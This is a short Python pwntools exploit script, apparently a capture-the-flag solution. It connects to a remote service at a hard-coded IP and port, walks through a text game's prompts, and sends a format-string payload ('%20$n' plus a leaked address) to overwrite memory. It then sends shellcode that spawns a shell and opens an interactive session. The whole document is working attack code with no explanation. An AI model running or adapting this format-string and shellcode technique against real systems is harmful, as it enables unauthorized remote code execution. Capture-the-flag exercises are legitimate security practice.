```
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
r = remote("61.147.171.105",57467)
r.recvuntil("secret[0] is ")
addr = int(r.recvuntil('\n')[:-1],16)
r.recvuntil("What should your character's name be:")
r.sendline('invincible')
r.recvuntil("So, where you will go?east or up?")
a = r.recvuntil(":")[:-1]
r.sendline('east')
r.recvuntil("go into there(1), or leave(0)?:")
r.sendline('1')
r.recvuntil("'Give me an address'")
r.sendline('1111')
r.recvuntil("And, you wish is:")
payload ='b'*85+'%20$n'+'a'*6+p64(addr).decode('unicode_escape')
r.sendline(payload)
r.recvuntil("Wizard: I will help you! USE YOU SPELL")
shellcode =asm(shellcraft.sh()) 
r.send(shellcode)
r.interactive() 
```